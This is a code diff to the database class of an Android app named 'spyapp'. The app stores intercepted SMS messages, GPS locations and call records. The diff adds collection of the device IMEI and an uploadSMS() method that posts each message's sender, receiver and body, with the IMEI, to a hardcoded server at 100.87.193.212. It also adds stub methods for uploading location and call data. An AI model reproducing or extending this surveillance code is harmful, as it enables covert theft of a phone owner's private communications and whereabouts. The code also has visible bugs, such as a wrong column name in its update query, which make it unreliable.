@@ -1,12 +1,25 @@
 package com.example.spyapp;
 
-import android.R.integer;
+import java.io.IOException;
+import java.io.UnsupportedEncodingException;
+import java.util.ArrayList;
+import java.util.List;
+
+import org.apache.http.HttpResponse;
+import org.apache.http.NameValuePair;
+import org.apache.http.client.ClientProtocolException;
+import org.apache.http.client.HttpClient;
+import org.apache.http.client.entity.UrlEncodedFormEntity;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.impl.client.DefaultHttpClient;
+import org.apache.http.message.BasicNameValuePair;
+
 import android.content.ContentValues;
 import android.content.Context;
 import android.database.Cursor;
 import android.database.sqlite.SQLiteDatabase;
 import android.database.sqlite.SQLiteOpenHelper;
-import android.provider.OpenableColumns;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 
 public class DatabaseHandler {
@@ -21,17 +34,19 @@ public class DatabaseHandler {
 	public static final String C_RECEIVER="RECEIVER";
 	public static final String C_BODY="BODY";
 	public static final String C_TYPE="TYPE";
+	public static final String C_UPLOADED="UPLOADED";
 	//Coloums for the Location Database
 	public static final String L_TIMESTAMP="TIMESTAMP";
 	public static final String L_LATITUDE="LATITUDE";
 	public static final String L_LONGITUDE="LONGITUDE";
+	public static final String L_UPLOADED="UPLOADED";
 	
 	public static final String D_TIMESTAMP="TIMESTAMP";
 	public static final String D_TYPE="TYPE";
 	public static final String D_DURATION="DURATION";
 	public static final String D_TO_FROM="TOFROM";
 	public static final String D_FILE="FILENAME";
-
+	public static final String D_UPLOADED="UPLOADED";
 	
 	public String[][] dbentries = new String[1000][150];
 	
@@ -39,10 +54,12 @@ public class DatabaseHandler {
 	private static String DB_PATH = ""; 
 
 	static final String TAG="DatabaseHandler";
+	public static String IMEI=null;
 	
+
 	Context context;
 	dbHelper dbhelper;
-	
+   
 	
 	public DatabaseHandler()
 	{
@@ -54,7 +71,10 @@ public class DatabaseHandler {
 	
 	}
 	public DatabaseHandler(Context context)
-	{
+	{ 
+		//Code to fetch the IMEI. This will be used in later functions.
+	    TelephonyManager tm = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE); 
+		IMEI= tm.getDeviceId();
 		this.context=context;
 	       DB_PATH = context.getApplicationInfo().dataDir + "/databases/";         
           //Log.d(TAG,DB_PATH);
@@ -64,7 +84,7 @@ public class DatabaseHandler {
 	}
 	
 	public void insertmsgintodb(long TIMESTAMP, String SENDER , String RECEIVER
-			, String BODY,int TYPE)
+			, String BODY,int TYPE,int UPLOADED)
 	{
 		SQLiteDatabase sqldb;
 		sqldb=dbhelper.getWritableDatabase();
@@ -75,18 +95,19 @@ public class DatabaseHandler {
 		values.put(C_RECEIVER,RECEIVER);
 		values.put(C_BODY,BODY);
 		values.put(C_TYPE,TYPE);
+		values.put(C_UPLOADED,UPLOADED);
 		 Log.d(TAG,"TIMESTAMP:"+Long.toString(TIMESTAMP));
 		 Log.d(TAG,"SENDER:"+SENDER);
          Log.d(TAG,"RECEIVER:"+RECEIVER);
          Log.d(TAG,"BODY:"+BODY);
          Log.d(TAG,"TYPE:"+Integer.toString(TYPE));
-         
+         Log.d(TAG,"UPLOADED:"+Integer.toString(UPLOADED));
 		sqldb.insert(MSG_TABLE_NAME,null,values);
 		sqldb.close();
 	}
 	
 
-	public void insertlocintodb(long TIMESTAMP, double LATITUDE , double LONGITUDE)
+	public void insertlocintodb(long TIMESTAMP, double LATITUDE , double LONGITUDE,int UPLOADED)
 	{
 		SQLiteDatabase sqldb;
 		sqldb=dbhelper.getWritableDatabase();
@@ -95,15 +116,17 @@ public class DatabaseHandler {
 		values.put(L_TIMESTAMP,TIMESTAMP);
 		values.put(L_LATITUDE,LATITUDE);
 		values.put(L_LONGITUDE,LONGITUDE);
+		values.put(L_UPLOADED, UPLOADED);
       	 Log.d(TAG,"TIMESTAMP:"+Long.toString(TIMESTAMP));
 		 Log.d(TAG,"LATITUDE:"+Double.toString(LATITUDE));
          Log.d(TAG,"LONGITUDE:"+Double.toString(LONGITUDE));
+         Log.d(TAG,"UPLOADED:"+Integer.toString(UPLOADED));
             
 		sqldb.insert(LOCATION_TABLE_NAME,null,values);
 		sqldb.close();
 	}
 	
-	public void insertcallintodb(long TIMESTAMP, int TYPE, Long DURATION,String TO_FROM, String FILENAME)
+	public void insertcallintodb(long TIMESTAMP, int TYPE, Long DURATION,String TO_FROM, String FILENAME,int UPLOADED)
 	{
 		SQLiteDatabase sqldb;
 		sqldb=dbhelper.getWritableDatabase();
@@ -114,11 +137,13 @@ public class DatabaseHandler {
 		values.put(D_DURATION,DURATION);
 		values.put(D_TO_FROM,TO_FROM);
 		values.put(D_FILE,FILENAME);
+		values.put(D_UPLOADED,UPLOADED);
 		 Log.d(TAG,"TIMESTAMP:"+Long.toString(TIMESTAMP));
 		 Log.d(TAG,"TYPE:"+Integer.toString(TYPE));
          Log.d(TAG,"DURATION:"+Double.toString(DURATION));
          Log.d(TAG,"TO_FROM:"+TO_FROM);
          Log.d(TAG,"FILENAME:"+FILENAME);
+         Log.d(TAG,"UPLOADED:"+UPLOADED);
 		sqldb.insert(CALL_TABLE_NAME,null,values);
 		sqldb.close();
 	}
@@ -163,6 +188,106 @@ public class DatabaseHandler {
         return true;
  
     }
+	
+	void uploadSMS()
+	{
+		SQLiteDatabase sqldb;
+		HttpClient httpclient = new DefaultHttpClient();
+		HttpPost httppost = new HttpPost("http://100.87.193.212:83/submit_sms.php");
+		int rowcount=0;
+		int responsecode=0;
+        sqldb=dbhelper.getWritableDatabase();
+        String selectQuery = "SELECT  * FROM " + MSG_TABLE_NAME;
+        Cursor cursor = sqldb.rawQuery(selectQuery, null);
+        cursor.moveToFirst();
+       // Log.d(TAG,"Cursor count:"+Integer.toString(cursor.getCount()));
+        while(cursor.moveToNext())
+        {
+        	Log.d(TAG,"UPLOADED STATUS:"+Integer.toString(cursor.getInt(5)));
+        	if (cursor.getInt(5) == 0)
+        	{
+        		
+        		List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
+                nameValuePairs.add(new BasicNameValuePair("IMEI", IMEI));
+                nameValuePairs.add(new BasicNameValuePair("TIMESTAMP", cursor.getString(0)));
+                nameValuePairs.add(new BasicNameValuePair("SENDER", cursor.getString(1)));
+                nameValuePairs.add(new BasicNameValuePair("RECEIVER", cursor.getString(2)));
+                nameValuePairs.add(new BasicNameValuePair("BODY", cursor.getString(3)));
+                nameValuePairs.add(new BasicNameValuePair("TYPE", cursor.getString(4)));
+                
+                try {
+					httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
+				} catch (UnsupportedEncodingException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+
+                // Execute HTTP Post Request
+                try {
+					HttpResponse response = httpclient.execute(httppost);
+					responsecode = response.getStatusLine().getStatusCode();
+					Log.d(TAG,"responsecode:"+Integer.toString(responsecode));
+				} catch (ClientProtocolException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				} catch (IOException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+                
+                if (responsecode==200)
+                {//If the message has been successfully updated
+	        		String updatequery = "UPDATE "+MSG_TABLE_NAME+" SET UPDATED='1' WHERE TIMESTAMP="+cursor.getString(0)+";";
+	        		sqldb.rawQuery(updatequery, null);
+                }
+        	}
+        }
+        cursor.close();
+        sqldb.close();
+       
+	}
+	
+	Boolean uploadGPS()
+	{
+		SQLiteDatabase sqldb;
+		int rowcount=0;
+        sqldb=dbhelper.getWritableDatabase();
+        String selectQuery = "SELECT  * FROM " + LOCATION_TABLE_NAME;
+        Cursor cursor = sqldb.rawQuery(selectQuery, null);
+        cursor.moveToFirst();
+        do
+        {
+        	if (cursor.getInt(3) == 0)
+        	{
+        		//If the GPS Location has not been uploaded
+        		//code to upload it to HTTP
+        	}
+        }while(cursor.moveToNext());
+        
+		return false;
+	}
+	
+	Boolean uploadCall()
+	{
+		SQLiteDatabase sqldb;
+		int rowcount=0;
+        sqldb=dbhelper.getWritableDatabase();
+        String selectQuery = "SELECT  * FROM " + CALL_TABLE_NAME;
+        Cursor cursor = sqldb.rawQuery(selectQuery, null);
+        cursor.moveToFirst();
+        do
+        {
+        	if (cursor.getInt(5) == 0)
+        	{
+        		//If the GPS Location has not been uploaded
+        		//code to upload it to HTTP
+        	}
+        }while(cursor.moveToNext());
+        
+		return false;
+	}
+	
+	
 	  public String[][] getAllvalues() {
 	        
 		  
@@ -237,24 +362,24 @@ public class DatabaseHandler {
 		 * 3)RECEIVER -> String
 		 * 4)BODY -> String
 		 * 5)TYPE -> Integer (1 for Inbox , 2 for Sent) 
-		 * 
+		 * 6) UPLOADED -> Boolean 
 		 * 
 		 */
 		public void onCreate(SQLiteDatabase db) {
 			//Log.d(TAG,"OnCreate called!");
 			String sql1 = String.format("create table if not exists %s" +
-					" (%s long primary key,%s text,%s text,%s text,%s int)"
-					,MSG_TABLE_NAME,C_TIMESTAMP,C_SENDER,C_RECEIVER,C_BODY,C_TYPE);
+					" (%s long primary key,%s text,%s text,%s text,%s int,%s int)"
+					,MSG_TABLE_NAME,C_TIMESTAMP,C_SENDER,C_RECEIVER,C_BODY,C_TYPE,C_UPLOADED);
 			//Log.d(TAG,"onCreate with SQL: "+sql1);
 			
 			String sql2 = String.format("create table if not exists %s" +
-					" (%s long primary key,%s double,%s double)"
-					,LOCATION_TABLE_NAME,L_TIMESTAMP,L_LATITUDE,L_LONGITUDE);
+					" (%s long primary key,%s double,%s double,%s int)"
+					,LOCATION_TABLE_NAME,L_TIMESTAMP,L_LATITUDE,L_LONGITUDE,L_UPLOADED);
 			//Log.d(TAG,"onCreate with SQL: "+sql1);
 			
 			String sql3 = String.format("create table if not exists %s" +
-					" (%s long primary key,%s int,%s long,%s text,%s text)"
-					,CALL_TABLE_NAME,D_TIMESTAMP,D_TYPE,D_DURATION,D_TO_FROM,D_FILE);
+					" (%s long primary key,%s int,%s long,%s text,%s text,%s int)"
+					,CALL_TABLE_NAME,D_TIMESTAMP,D_TYPE,D_DURATION,D_TO_FROM,D_FILE,D_UPLOADED);
 			
 			db.execSQL(sql1);
 			db.execSQL(sql2);
